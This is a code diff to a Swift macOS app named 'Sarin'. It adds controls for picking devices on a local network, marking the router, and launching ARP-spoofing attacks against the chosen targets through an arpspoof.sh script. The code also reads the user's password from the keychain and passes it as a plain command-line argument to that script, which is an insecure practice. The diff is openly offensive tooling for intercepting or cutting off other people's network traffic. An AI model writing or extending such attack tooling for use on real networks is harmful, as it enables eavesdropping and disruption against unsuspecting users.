@@ -7,11 +7,15 @@
 //
 
 import Cocoa
+import KeychainAccess
 
 class ViewController: NSViewController {
 
     override func viewDidLoad() {
         super.viewDidLoad()
+        attackButton.isEnabled = false
+        stopAttacksButton.isEnabled = false
+        setRouterButton.isEnabled = false
         tableView.delegate = self
         tableView.dataSource = self
 //        hasBeenSetup = false
@@ -30,16 +34,28 @@ class ViewController: NSViewController {
     //MARK: Outlets
     @IBOutlet weak var tableView: NSTableView!
     @IBOutlet weak var progressSpinner: NSProgressIndicator!
+    @IBOutlet weak var attackButton: NSButton!
+    @IBOutlet weak var setRouterButton: NSButton!
+    @IBOutlet weak var stopAttacksButton: NSButton!
     
     //MARK: Variables
     var hasBeenSetup:Bool = defaults.bool(forKey: "isInstalled")
     var data:[String] = []
     let location:String = defaults.string(forKey: "installLocation") ?? ""
+    
+    let keychain = Keychain(service: "Sarin")
+    
     var scanDict = ["ip1": "mac1","ip2": "mac2","ip3": "mac3"]
     var ipList:[String] = []
     var macList:[String] = []
     var infoList:[String] = []
     var unparsedScan:String = ""
+    
+    var rowIndexes:[Int] = []
+    
+    var routerIP:String = ""
+    
+    var currentDevices:[String] = []
     
     //MARK: Parse Output Function
     func parseOutput(input: String){
@@ -118,7 +134,60 @@ class ViewController: NSViewController {
         SetupViewController.preferredContentSize = CGSize(width: 708, height: 447)
         self.presentAsSheet(SetupViewController)
     }
+    
+    //Mark: Function to get a list of IPs from the selected rows
+    func getIPsFromRowIndexes() -> [String]{
+        var ipsFromRowIndexes: [String] = []
+        
+        for (_,rowIndex) in rowIndexes.enumerated(){
+            ipsFromRowIndexes.append(ipList[rowIndex])
+        }
+        return ipsFromRowIndexes
+    }
 
+    func attackUsers(){
+        for (_,user) in currentDevices.enumerated(){
+            let task = Process.init()
+            task.launchPath = "/bin/bash"
+            task.arguments = (["--login",location+"/Sarin/sarin_scripts/arpspoof.sh", user,routerIP,keychain[NSUserName()]] as! [String])
+            task.launch()
+            
+            let group = DispatchGroup()
+            group.enter()
+            
+            DispatchQueue.global().async {
+                task.waitUntilExit()
+                group.leave()
+            }
+            group.notify(queue: .main) {
+                
+            }
+        }
+        
+    }
+    @IBAction func setRouterIP(_ sender: Any) {
+        routerIP = ipList[tableView.selectedRowIndexes.map { Int($0) }[0]]
+        setRouterButton.isEnabled = false
+        tableView.reloadData()
+    }
+    
+    @IBAction func attackButtonPressed(_ sender: NSButton) {
+        currentDevices = getIPsFromRowIndexes()
+//        print(currentDevices)
+        tableView.reloadData()
+        attackUsers()
+        stopAttacksButton.isEnabled = true
+        attackButton.isEnabled = false
+        setRouterButton.isEnabled = false
+    }
+    
+    @IBAction func stopAttackButtonPressed(_ sender: Any) {
+        currentDevices = []
+        tableView.reloadData()
+        killall()
+        attackButton.isEnabled = true
+        stopAttacksButton.isEnabled = false
+    }
     
 
 }
@@ -127,6 +196,32 @@ extension ViewController:NSTableViewDataSource,NSTableViewDelegate{
     fileprivate enum CellIdentifiers {
         static let ipCell = "ipCellID"
         static let macCell = "macCellID"
+    }
+
+    
+    func updateSelectionStatus(){
+        let itemsSelected:Int = tableView.selectedRowIndexes.count
+        
+//        print(tableView.selectedRowIndexes.map { Int($0) })
+        
+        attackButton.title = "Attack Selected Devices " + "(" + String(itemsSelected) + ")"
+        
+        if (itemsSelected != 0){
+            setRouterButton.isEnabled = true
+            if routerIP != ""{
+                attackButton.isEnabled = true
+            }
+        }else{
+            attackButton.isEnabled = false
+            setRouterButton.isEnabled = false
+        }
+        
+        
+    }
+    
+    func tableViewSelectionDidChange(_ notification: Notification) {
+        rowIndexes = tableView.selectedRowIndexes.map { Int($0) }
+        updateSelectionStatus()
     }
     
     func numberOfRows(in tableView: NSTableView) -> Int {
@@ -144,6 +239,26 @@ extension ViewController:NSTableViewDataSource,NSTableViewDelegate{
             data = infoList
         }
         if let cell = tableView.makeView(withIdentifier: NSUserInterfaceItemIdentifier(rawValue: "ipCellID"), owner: self) as? NSTableCellView {
+            
+            if currentDevices.contains(ipList[row]){
+//                print(currentDevices)
+                
+                cell.textField?.textColor = NSColor.red
+                cell.textField?.stringValue = self.data[row]
+//                print(ipList[row])
+                
+                return cell
+            }
+            if routerIP==ipList[row]{
+//                print(currentDevices)
+                
+                cell.textField?.textColor = NSColor.systemBlue
+                cell.textField?.stringValue = self.data[row]
+//                print(ipList[row])
+                
+                return cell
+            }
+            cell.textField?.textColor = NSColor.controlTextColor
             cell.textField?.stringValue = self.data[row]
             return cell
         }
